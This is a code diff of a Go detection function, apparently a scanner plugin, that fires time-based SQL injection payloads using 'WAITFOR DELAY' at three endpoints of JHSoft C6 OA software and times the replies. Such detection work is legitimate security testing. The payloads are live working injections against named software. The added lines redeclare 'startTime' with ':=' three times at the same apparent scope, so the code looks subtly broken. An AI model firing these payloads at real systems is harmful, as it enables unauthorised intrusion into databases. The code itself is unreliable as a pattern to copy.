@@ -22,6 +22,7 @@ func Check(url string) bool {
 			}
 		}
 	}
+	startTime := time.Now()
 	if req, err := pkg.HttpRequset(url+"/C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1%20WAITFOR%20DELAY%20'0:0:5'--&TVersion=1", "GET", "", false, nil); err == nil {
 		if req.StatusCode == 200 {
 			// 请求成功，计算响应时间
@@ -34,6 +35,7 @@ func Check(url string) bool {
 			}
 		}
 	}
+	startTime := time.Now()
 	if req, err := pkg.HttpRequset(url+"/C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:5%27--", "GET", "", false, nil); err == nil {
 		if req.StatusCode == 200 {
 			// 请求成功，计算响应时间
@@ -46,6 +48,7 @@ func Check(url string) bool {
 			}
 		}
 	}
+	startTime := time.Now()
 	if req, err := pkg.HttpRequset(url+"/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1;WAITFOR+DELAY+'0:0:5'--", "GET", "", false, nil); err == nil {
 		if req.StatusCode == 200 {
 			// 请求成功，计算响应时间
